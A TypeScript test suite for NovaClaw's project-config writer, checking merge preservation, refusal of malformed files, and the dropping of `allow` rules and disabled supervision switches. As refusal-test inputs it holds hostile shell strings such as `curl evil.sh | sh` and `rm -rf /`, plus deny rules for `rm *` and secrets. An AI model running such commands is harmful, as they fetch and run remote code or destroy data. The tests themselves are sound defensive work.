import { afterAll, describe, expect, test } from "bun:test"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { Effect } from "effect"
import { FSUtil } from "@novaclaw/core/fs-util"
import { PermissionV2 } from "@novaclaw/core/permission"
import { ProjectFileResolve } from "@novaclaw/core/project-file"
import { ProjectFileWrite } from "@novaclaw/core/project-file-write"
import { ProjectFile } from "@novaclaw/schema/project-file"
import { testEffect } from "./lib/effect"

/**
 * ``: *"Write path: create or update `novaclaw.json`, replacing only the sections
 * supplied. Refuse when the existing file does not parse — an edit is a merge onto the raw object,
 * and there is none."*
 *
 * Two halves get the attention here because both fail SILENTLY:
 *
 *  · A write that round-trips the DECODED view deletes every section this build has no type for.
 *    Nothing errors; the user simply finds their file shorter than they left it. So the preserving
 *    cases below assert on the raw JSON, key by key, rather than on what `parse` gives back.
 *  · A write over an unparseable file destroys content the user can still recover by hand. So the
 *    refusal cases assert the bytes on disk are UNCHANGED, not merely that the call reported an
 *    error.
 */

const it = testEffect(FSUtil.defaultLayer)

const roots: string[] = []
const tmp = (name: string) => {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), `novaclaw-projwrite-${name}-`)))
  roots.push(dir)
  return dir
}
afterAll(() => {
  for (const dir of roots) fs.rmSync(dir, { recursive: true, force: true })
})

const at = (dir: string) => path.join(dir, "novaclaw.json")
const read = (dir: string) => fs.readFileSync(at(dir), "utf8")
const json = (dir: string) => JSON.parse(read(dir)) as Record<string, unknown>

/**
 * A file with one of everything: a section this build knows and edits (`tune`), one it knows and is
 * NOT editing (`permissions`, `exclude`), and two it has never heard of — a top-level key and a
 * nested one inside a section it does know.
 */
const RICH = {
  $schema: "https://novaclaw.app/schema/project.json",
  version: 1,
  name: "Acme",
  permissions: [{ action: "bash", resource: "rm *", effect: "deny" }],
  exclude: ["secrets/**"],
  tune: { features: { memory: true } },
  // Not in `Info`. A newer NovaClaw wrote these; this build must hand them back untouched.
  futureSection: { enabled: true, weights: [1, 2, 3] },
  telemetry: "off",
}

describe("writing novaclaw.json", () => {
  it.effect("creates the file when the folder has none", () =>
    Effect.gen(function* () {
      const dir = tmp("create")
      const result = yield* ProjectFileWrite.write(dir, { tune: { features: { memory: true, quality: false } } })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.created).toBe(true)
      expect(result.file).toBe(at(dir))
      expect(result.sections).toEqual(["tune"])
      expect(json(dir)).toEqual({ version: 1, tune: { features: { memory: true, quality: false } } })
    }),
  )

  it.effect("🔴 replaces ONLY the section supplied — everything else survives, known or not", () =>
    Effect.gen(function* () {
      const dir = tmp("merge")
      fs.writeFileSync(at(dir), `${JSON.stringify(RICH, null, 2)}\n`)

      const result = yield* ProjectFileWrite.write(dir, { tune: { features: { surgicalEdits: true } } })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.created).toBe(false)
      expect(result.sections).toEqual(["tune"])

      const after = json(dir)
      // The new tune is there, whole — a section is REPLACED, not deep-merged, so the old `memory`
      // key is gone. That is the honest semantics: a caller holding the section holds all of it, and
      // a deep merge cannot express "this list is now empty".
      expect(after["tune"]).toEqual({ features: { surgicalEdits: true } })
      // Everything else is byte-for-byte what it was.
      expect(after["$schema"]).toBe(RICH.$schema)
      expect(after["version"]).toBe(1)
      expect(after["name"]).toBe("Acme")
      expect(after["permissions"]).toEqual(RICH.permissions)
      expect(after["exclude"]).toEqual(RICH.exclude)
      expect(after["futureSection"]).toEqual(RICH.futureSection)
      expect(after["telemetry"]).toBe("off")
      // And the whole document differs from the original in exactly one key.
      const changed = Object.keys(after).filter(
        (key) => JSON.stringify(after[key]) !== JSON.stringify((RICH as Record<string, unknown>)[key]),
      )
      expect(changed).toEqual(["tune"])
    }),
  )

  it.effect("writes several sections at once and still leaves the rest alone", () =>
    Effect.gen(function* () {
      const dir = tmp("sections")
      fs.writeFileSync(at(dir), `${JSON.stringify(RICH, null, 2)}\n`)
      const result = yield* ProjectFileWrite.write(dir, {
        name: "Renamed",
        exclude: ["build/**"],
        policies: ["policy.review"],
      })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      // Reported in the module's declared order, not the caller's object order.
      expect(result.sections).toEqual(["name", "exclude", "policies"])
      const after = json(dir)
      expect(after["name"]).toBe("Renamed")
      expect(after["exclude"]).toEqual(["build/**"])
      expect(after["policies"]).toEqual(["policy.review"])
      expect(after["permissions"]).toEqual(RICH.permissions)
      expect(after["futureSection"]).toEqual(RICH.futureSection)
    }),
  )

  it.effect("🔴 REFUSES a file that is not JSON, and leaves it exactly as it was", () =>
    Effect.gen(function* () {
      const dir = tmp("malformed")
      const original = '{ "version": 1, "name": "half-typed"\n'
      fs.writeFileSync(at(dir), original)

      const result = yield* ProjectFileWrite.write(dir, { tune: { features: { memory: true } } })
      expect(result.ok).toBe(false)
      if (result.ok) return
      expect(result.reason).toBe("unreadable")
      expect(result.detail.length).toBeGreaterThan(0)
      expect(result.file).toBe(at(dir))
      // The point of the refusal: their file is still there to fix.
      expect(read(dir)).toBe(original)
    }),
  )

  it.effect("🔴 REFUSES valid JSON that fails the schema, and leaves it exactly as it was", () =>
    Effect.gen(function* () {
      const dir = tmp("schema")
      // Parses as JSON; `permissions` is not a ruleset and `version` is fine, so only the DECODE
      // rejects it. A write path that only tried `JSON.parse` would sail past this one.
      const original = `${JSON.stringify({ version: 1, permissions: "everything" }, null, 2)}\n`
      fs.writeFileSync(at(dir), original)

      const result = yield* ProjectFileWrite.write(dir, { tune: { features: { memory: true } } })
      expect(result.ok).toBe(false)
      if (result.ok) return
      expect(result.reason).toBe("not-an-object")
      expect(read(dir)).toBe(original)
    }),
  )

  it.effect("a file from a NEWER NovaClaw is refused as `future-version`, not as corruption", () =>
    Effect.gen(function* () {
      const dir = tmp("future")
      const original = `${JSON.stringify({ version: 9999, mystery: true }, null, 2)}\n`
      fs.writeFileSync(at(dir), original)
      const result = yield* ProjectFileWrite.write(dir, { tune: { features: { memory: true } } })
      expect(result.ok).toBe(false)
      if (result.ok) return
      // Upgrade, versus fix your file. Overwriting here would destroy a file this build cannot read
      // but a newer one can.
      expect(result.reason).toBe("future-version")
      expect(read(dir)).toBe(original)
    }),
  )

  it.effect("🔴 a supervision switch is never RECORDED as off — it is dropped and reported", () =>
    Effect.gen(function* () {
      const dir = tmp("supervision")
      const result = yield* ProjectFileWrite.write(dir, {
        tune: { features: { safeMode: false, askBeforeChanges: false, memory: false, quality: true } },
      })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.refusedTune).toEqual(["safeMode", "askBeforeChanges"])
      // `memory: false` is a PREFERENCE and is written; the two rails are simply absent, which means
      // inherit — the folder takes no position on them.
      expect(json(dir)["tune"]).toEqual({ features: { memory: false, quality: true } })
    }),
  )

  it.effect("a supervision switch turned ON is written normally", () =>
    Effect.gen(function* () {
      const dir = tmp("raise")
      const result = yield* ProjectFileWrite.write(dir, { tune: { features: { safeMode: true } } })
      expect(result.ok).toBe(true)
      expect(json(dir)["tune"]).toEqual({ features: { safeMode: true } })
    }),
  )

  it.effect("writes LF line endings and a trailing newline, on every platform", () =>
    Effect.gen(function* () {
      const dir = tmp("newlines")
      yield* ProjectFileWrite.write(dir, { tune: { features: { memory: true } } })
      const text = read(dir)
      // A CRLF file is invisible to `git status` under `text=auto`; only a byte check ever sees it.
      expect(text.includes("\r")).toBe(false)
      expect(text.endsWith("}\n")).toBe(true)
      expect(text.split("\n").length).toBeGreaterThan(3)
    }),
  )

  it.effect("a folder whose path contains spaces is written like any other", () =>
    Effect.gen(function* () {
      const base = tmp("spaces")
      const dir = path.join(base, "My Projects", "Acme Corp")
      fs.mkdirSync(dir, { recursive: true })
      const result = yield* ProjectFileWrite.write(dir, { name: "Acme Corp" })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.file).toBe(at(dir))
      expect(json(dir)["name"]).toBe("Acme Corp")
    }),
  )

  it.effect("the target is resolved against the folder — a relative directory still lands inside it", () =>
    Effect.gen(function* () {
      const dir = tmp("resolve")
      // `path.resolve` inside `write` is what makes this predictable; the assertion is that the file
      // never escapes the folder it was asked about, which is AGENTS.md principle 11(c).
      const result = yield* ProjectFileWrite.write(path.join(dir, "sub", ".."), { name: "here" })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(path.dirname(result.file)).toBe(dir)
      expect(path.basename(result.file)).toBe("novaclaw.json")
    }),
  )

  it.effect("🔴 round trip: after a write the resolver reports the folder as a Project with that tune", () =>
    Effect.gen(function* () {
      const dir = tmp("roundtrip")
      const write = yield* ProjectFileWrite.write(dir, {
        name: "Round",
        tune: { mode: "interactive", features: { memory: true, safeMode: true, affective: false } },
      })
      expect(write.ok).toBe(true)

      // The READ side, unchanged, over the bytes the write side produced. This is the join the two
      // halves are only ever tested apart from — a write whose output the resolver rejects would
      // pass every assertion above.
      const resolved = yield* ProjectFileResolve.resolve(dir, dir)
      expect(resolved.kind).toBe("project")
      if (resolved.kind !== "project") return
      expect(resolved.root).toBe(dir)
      expect(resolved.file).toBe(at(dir))
      expect(resolved.info.name).toBe("Round")
      expect(resolved.info.tune).toEqual({
        mode: "interactive",
        features: { memory: true, safeMode: true, affective: false },
      })
    }),
  )

  // ── PERMISSIONS: the section the Permissions surface writes back ─────────────────────────────
  //
  // 🔴 The failure mode this block exists for is a control that appears to work. A project ruleset
  // is folded in by `PermissionV2.evaluateNarrowed` as a CONSTRAINT — it can only raise
  // restrictiveness — so an `allow` rule saved into `novaclaw.json` is read, matched, and then
  // provably ignored. Writing one produces a cheerful receipt, a file that says the folder grants
  // something, and a product that does the opposite. Same shape as the supervision-switch rule
  // above, on the half that started the narrowing story.

  it.effect("🔴 writes ONLY the permissions section — tune, exclude and unknown fields are untouched", () =>
    Effect.gen(function* () {
      const dir = tmp("permissions-only")
      const original = `${JSON.stringify(RICH, null, 2)}\n`
      fs.writeFileSync(at(dir), original)

      const result = yield* ProjectFileWrite.write(dir, {
        permissions: [{ action: "read", resource: "secrets/*", effect: "deny" }],
      })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.sections).toEqual(["permissions"])
      expect(result.cleared).toEqual([])
      expect(result.refusedPermissions).toEqual([])

      const after = json(dir)
      expect(after["permissions"]).toEqual([{ action: "read", resource: "secrets/*", effect: "deny" }])
      // Every other key, compared as a set of changed keys rather than one assertion per field: a
      // field-by-field check passes for a write that ADDS something nobody asked for.
      const changed = Object.keys({ ...RICH, ...after }).filter(
        (key) => JSON.stringify(after[key]) !== JSON.stringify((RICH as Record<string, unknown>)[key]),
      )
      expect(changed).toEqual(["permissions"])
    }),
  )

  it.effect("🔴 an `allow` rule is NEVER recorded — it is dropped and reported, never silently kept", () =>
    Effect.gen(function* () {
      const dir = tmp("permissions-allow")
      const result = yield* ProjectFileWrite.write(dir, {
        permissions: [
          { action: "bash", resource: "*", effect: "deny" },
          { action: "read", resource: "*", effect: "allow" },
          { action: "edit", resource: "*", effect: "ask" },
        ],
      })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      // Reported, in the caller's own order, so a surface can name exactly what it refused.
      expect(result.refusedPermissions).toEqual([{ action: "read", resource: "*", effect: "allow" }])
      // `deny` and `ask` both narrow, so both land.
      expect(json(dir)["permissions"]).toEqual([
        { action: "bash", resource: "*", effect: "deny" },
        { action: "edit", resource: "*", effect: "ask" },
      ])
    }),
  )

  it.effect("🔴 the dropped `allow` really was inert: the evaluator would have ignored it anyway", () =>
    Effect.gen(function* () {
      // The claim the refusal rests on, checked against the evaluator itself rather than restated.
      // `evaluateNarrowed` keeps the base verdict unless the constraint is STRICTLY more restrictive.
      const base: PermissionV2.Ruleset = [{ action: "bash", resource: "*", effect: "deny" }]
      const widen: PermissionV2.Ruleset = [{ action: "bash", resource: "*", effect: "allow" }]
      expect(PermissionV2.evaluateNarrowed("bash", "rm -rf /", [base], [widen]).effect).toBe("deny")
      // And with an `allow` base, an `allow` constraint changes nothing either — it is inert in
      // both directions, which is why it is never worth writing.
      const permissive: PermissionV2.Ruleset = [{ action: "bash", resource: "*", effect: "allow" }]
      expect(PermissionV2.evaluateNarrowed("bash", "ls", [permissive], [widen]).effect).toBe("allow")
      // The one a project file CAN do.
      const narrow: PermissionV2.Ruleset = [{ action: "bash", resource: "*", effect: "deny" }]
      expect(PermissionV2.evaluateNarrowed("bash", "ls", [permissive], [narrow]).effect).toBe("deny")
      yield* Effect.void
    }),
  )

  // ── CLEARING A SECTION — the item `` recorded as needing a decision ───────────
  //
  // Decided per principle 10: an explicit `clear` list. `Schema.optional` cannot tell "absent" from
  // "cleared", so `undefined` was unreachable from a client and "remove all of this folder's
  // permission rules" was not expressible at all.

  it.effect("🔴 `clear` REMOVES a section, and removes only that one", () =>
    Effect.gen(function* () {
      const dir = tmp("clear")
      fs.writeFileSync(at(dir), `${JSON.stringify(RICH, null, 2)}\n`)

      const result = yield* ProjectFileWrite.write(dir, { clear: ["permissions"] })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.cleared).toEqual(["permissions"])
      expect(result.sections).toEqual([])

      const after = json(dir)
      // GONE, not present-and-empty: `[]` and absent mean the same thing to the reader, and the
      // user asked for the sentence to be removed from their file.
      expect("permissions" in after).toBe(false)
      expect(after["tune"]).toEqual(RICH.tune)
      expect(after["exclude"]).toEqual(RICH.exclude)
      expect(after["futureSection"]).toEqual(RICH.futureSection)
      expect(after["version"]).toBe(1)
    }),
  )

  it.effect("clearing a section that was never there is a no-op that still reports honestly", () =>
    Effect.gen(function* () {
      const dir = tmp("clear-absent")
      fs.writeFileSync(at(dir), `${JSON.stringify({ version: 1, name: "n" }, null, 2)}\n`)
      const result = yield* ProjectFileWrite.write(dir, { clear: ["exclude"] })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.cleared).toEqual(["exclude"])
      expect(json(dir)).toEqual({ version: 1, name: "n" })
    }),
  )

  it.effect("clearing and replacing in one call: two different sections, both applied", () =>
    Effect.gen(function* () {
      const dir = tmp("clear-and-set")
      fs.writeFileSync(at(dir), `${JSON.stringify(RICH, null, 2)}\n`)
      const result = yield* ProjectFileWrite.write(dir, {
        clear: ["permissions"],
        exclude: ["secrets/**", "*.pem"],
      })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.cleared).toEqual(["permissions"])
      expect(result.sections).toEqual(["exclude"])
      const after = json(dir)
      expect("permissions" in after).toBe(false)
      expect(after["exclude"]).toEqual(["secrets/**", "*.pem"])
    }),
  )

  it.effect("🔴 asking to both replace and remove one section is REFUSED without writing", () =>
    Effect.gen(function* () {
      const dir = tmp("contradiction")
      const original = `${JSON.stringify(RICH, null, 2)}\n`
      fs.writeFileSync(at(dir), original)
      const result = yield* ProjectFileWrite.write(dir, {
        clear: ["exclude"],
        exclude: ["something"],
      })
      expect(result.ok).toBe(false)
      if (result.ok) return
      // Its own reason: the fault is in the REQUEST, and calling it a broken file would send the
      // user to fix a file that is fine.
      expect(result.reason).toBe("contradictory")
      expect(result.detail).toContain("exclude")
      expect(read(dir)).toBe(original)
    }),
  )

  it.effect("a cleared file still reads back as a valid Project", () =>
    Effect.gen(function* () {
      const dir = tmp("clear-roundtrip")
      yield* ProjectFileWrite.write(dir, {
        name: "Acme",
        permissions: [{ action: "bash", resource: "*", effect: "deny" }],
      })
      yield* ProjectFileWrite.write(dir, { clear: ["permissions"] })
      const resolved = yield* ProjectFileResolve.resolve(dir, dir)
      expect(resolved.kind).toBe("project")
      if (resolved.kind !== "project") return
      expect(resolved.info.name).toBe("Acme")
      expect(resolved.info.permissions).toBeUndefined()
    }),
  )

  it.effect("a second write updates rather than duplicating, and keeps what the first wrote", () =>
    Effect.gen(function* () {
      const dir = tmp("twice")
      yield* ProjectFileWrite.write(dir, { name: "First", tune: { features: { memory: true } } })
      const second = yield* ProjectFileWrite.write(dir, { tune: { features: { quality: true } } })
      expect(second.ok).toBe(true)
      if (!second.ok) return
      expect(second.created).toBe(false)
      const after = json(dir)
      expect(after["name"]).toBe("First")
      expect(after["tune"]).toEqual({ features: { quality: true } })
    }),
  )
})

// ── POLICIES: the section Settings → "Checks before every tool" writes back ───────────────────────
//
// 🔴 Two properties of this section were enforced by TYPE alone until a write surface existed, and a
// write surface is exactly what puts them at risk:
//
//  · `novaclaw.json` names a policy by ID and may NEVER carry a command. The grammar makes one
//    unspellable, and a violating entry makes the whole FILE fail to parse — which is right for a
//    file we read and wrong as the answer to a write, because it reports "your novaclaw.json is
//    broken" about a file that is fine and takes the user's other edits down with it.
//  · A folder may only ever NARROW. It opts a policy IN; there is no spelling for REMOVING one, so
//    the property holds by construction and is pinned as behaviour in
//    `test/tool-policy-management.test.ts` ("what a folder's policy list can NEVER do").
//
// ⚠️ An earlier version of this module also refused an id naming an ALWAYS-ON policy. That was
// narrowed on 2026-08-19 and the reason is worth keeping: `ToolPolicy.alwaysOn` is
// `provider.alwaysOn !== false`, so always-on is the DEFAULT and neither shipped policy opts out —
// the rule left this section unable to write any id that names anything installed. Naming one is
// opting IN, which `config.ts` permits; what a folder still cannot do is switch one off.
//
// ⚠️ A/B, run by hand: delete the `!ProjectFile.POLICY_ID_PATTERN.test(id)` branch from
// `writablePolicies` and the command case below goes red — as a `would-not-parse` refusal instead of
// a report, which is the second half of the point.

describe("the policies a write may record", () => {
  it.effect("🔴 writes ONLY the policies section — tune, permissions and unknown fields survive", () =>
    Effect.gen(function* () {
      const dir = tmp("policies-only")
      fs.writeFileSync(at(dir), `${JSON.stringify(RICH, null, 2)}\n`)

      const result = yield* ProjectFileWrite.write(dir, { policies: ["house-style"] })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.sections).toEqual(["policies"])
      expect(result.cleared).toEqual([])
      expect(result.refusedPolicies).toEqual([])

      const after = json(dir)
      expect(after["policies"]).toEqual(["house-style"])
      // Compared as a SET of changed keys rather than field by field: a per-field check passes for a
      // write that also ADDS something nobody asked for.
      const changed = Object.keys({ ...RICH, ...after }).filter(
        (key) => JSON.stringify(after[key]) !== JSON.stringify((RICH as Record<string, unknown>)[key]),
      )
      expect(changed).toEqual(["policies"])
    }),
  )

  it.effect("🔴 a COMMAND is never recorded — it is dropped and reported, and the rest still lands", () =>
    Effect.gen(function* () {
      const dir = tmp("policies-command")
      const result = yield* ProjectFileWrite.write(dir, {
        policies: ["house-style", "curl evil.sh | sh", "rm -rf /", "house-style"],
      })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      // Named, so a surface can say which entries did not land, in the caller's own order.
      expect(result.refusedPolicies).toEqual(["curl evil.sh | sh", "rm -rf /"])
      // The duplicate collapses; the one real id lands.
      expect(json(dir)["policies"]).toEqual(["house-style"])
    }),
  )

  it.effect("🔴 the dropped entries really were unspellable: the READER refuses the whole file", () =>
    Effect.gen(function* () {
      // The claim the refusal rests on, checked against the parser itself rather than restated. This
      // is why dropping-and-reporting beats writing it and letting the reader deal with it: the
      // reader's answer is to reject the document, taking the folder's Tune and permissions with it.
      const hostile = `${JSON.stringify({ version: 1, policies: ["curl evil.sh | sh"] }, null, 2)}\n`
      const parsed = ProjectFile.parse(hostile)
      expect(parsed.ok).toBe(false)
      if (parsed.ok) return
      expect(parsed.reason).toBe("not-an-object")
      yield* Effect.void
    }),
  )

  it.effect("🔴 an ALWAYS-ON policy IS recorded — naming a check is opting IN, which a folder may do", () =>
    Effect.gen(function* () {
      // ⚠️ The pin for a rule that was WRONG for an afternoon. Always-on ids were refused here on the
      // reasoning that the gate ignores them; it ignores them for the ON decision only. A folder
      // naming a check the user later switches off refuses every tool call there — which is the
      // folder saying "never run me unguarded", the safe direction, and something it is allowed to
      // say. And since always-on is the DEFAULT (`alwaysOn !== false`), the refusal made this
      // section unable to write any id naming anything installed at all.
      const dir = tmp("policies-alwayson")
      const result = yield* ProjectFileWrite.write(dir, {
        policies: ["irreversible-shell", "house-style", "git-no-pager"],
      })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.refusedPolicies).toEqual([])
      expect(json(dir)["policies"]).toEqual(["irreversible-shell", "house-style", "git-no-pager"])
    }),
  )

  it.effect("🔴 a malformed file is REFUSED before any of this, and its bytes are untouched", () =>
    Effect.gen(function* () {
      const dir = tmp("policies-malformed")
      const original = '{ "version": 1, "policies": ["house-style"\n'
      fs.writeFileSync(at(dir), original)
      const result = yield* ProjectFileWrite.write(dir, { policies: ["house-style", "curl x | sh"] })
      expect(result.ok).toBe(false)
      if (result.ok) return
      expect(result.reason).toBe("unreadable")
      // The point: their file is still there to fix, and we did not "repair" it into our own shape.
      expect(read(dir)).toBe(original)
    }),
  )

  it.effect("clearing removes the whole list, and only it", () =>
    Effect.gen(function* () {
      const dir = tmp("policies-clear")
      fs.writeFileSync(at(dir), `${JSON.stringify({ ...RICH, policies: ["house-style"] }, null, 2)}\n`)
      const result = yield* ProjectFileWrite.write(dir, { clear: ["policies"] })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.cleared).toEqual(["policies"])
      const after = json(dir)
      expect("policies" in after).toBe(false)
      expect(after["tune"]).toEqual(RICH.tune)
      expect(after["futureSection"]).toEqual(RICH.futureSection)
    }),
  )

  it.effect("🔴 round trip: what the write produced is what the resolver reads back", () =>
    Effect.gen(function* () {
      const dir = tmp("policies-roundtrip")
      yield* ProjectFileWrite.write(dir, { policies: ["house-style", "no-secrets"] })
      const resolved = yield* ProjectFileResolve.resolve(dir, dir)
      expect(resolved.kind).toBe("project")
      if (resolved.kind !== "project") return
      // The join the two halves are otherwise only ever tested apart from: a write whose output the
      // resolver rejects would satisfy every assertion above it.
      expect(resolved.info.policies).toEqual(["house-style", "no-secrets"])
    }),
  )
})

describe("planning a write (no filesystem)", () => {
  const file = path.join(path.sep === "\\" ? "C:\\work\\acme" : "/work/acme", "novaclaw.json")

  test("an absent section is left alone; a present one replaces", () => {
    const planned = ProjectFileWrite.plan(
      file,
      JSON.stringify({ version: 1, name: "keep", exclude: ["a"], unknown: 7 }),
      { exclude: ["b"] },
    )
    expect(planned.ok).toBe(true)
    if (!planned.ok) return
    expect(planned.sections).toEqual(["exclude"])
    const parsed = JSON.parse(planned.text) as Record<string, unknown>
    expect(parsed).toEqual({ version: 1, name: "keep", exclude: ["b"], unknown: 7 })
  })

  test("supplying nothing rewrites the file unchanged rather than emptying it", () => {
    const original = { version: 1, name: "keep", unknown: 7 }
    const planned = ProjectFileWrite.plan(file, JSON.stringify(original), {})
    expect(planned.ok).toBe(true)
    if (!planned.ok) return
    expect(planned.sections).toEqual([])
    expect(JSON.parse(planned.text)).toEqual(original)
  })

  test("a Windows-shaped path is carried through verbatim", () => {
    const windows = "C:\\Users\\nancy\\My Work\\acme\\novaclaw.json"
    const planned = ProjectFileWrite.plan(windows, undefined, { name: "acme" })
    expect(planned.ok).toBe(true)
    if (!planned.ok) return
    expect(planned.created).toBe(true)
    // The path is data here — it appears in the receipt and in a refusal, and a backslash must not
    // be mangled on the way through.
    const refusal = ProjectFileWrite.plan(windows, "{ broken", { name: "acme" })
    expect(refusal.ok).toBe(false)
    if (refusal.ok) return
    expect(refusal.file).toBe(windows)
  })
})
